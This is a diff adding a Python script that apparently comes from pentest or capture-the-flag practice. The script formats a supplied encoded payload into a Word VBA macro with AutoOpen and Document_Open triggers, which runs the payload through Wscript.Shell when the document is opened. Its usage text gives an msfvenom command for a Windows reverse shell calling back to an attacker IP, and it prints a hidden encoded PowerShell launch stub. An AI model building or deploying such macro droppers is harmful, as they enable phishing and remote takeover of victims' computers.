@@ -1,0 +1,37 @@
+#!/usr/bin/python3
+import sys
+
+if len(sys.argv) == 1:
+    print ("Format a macro to embed a reverse shell for powershell")
+    print ("msfvenom -p windows/shell_reverse_tcp LHOST=$A_IP LPORT=443 -f hta-psh")
+    sys.exit()
+payload=sys.argv[1]
+print ("Remember your flag")
+print ("powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA")
+
+n = 50
+
+print ("="*80)
+print ('''
+Sub AutoOpen()
+    start
+End Sub
+
+Sub Document_Open()
+    start
+End Sub
+
+Sub start()
+'
+' start Macro
+'
+'
+Dim Str As String
+''')
+for i in range(0, len(payload), n):
+	print ("Str = Str + " + '"' + payload[i:i+n] + '"')
+print ('''
+ CreateObject("Wscript.Shell").Run Str
+End Sub
+''')
+print ("="*80)
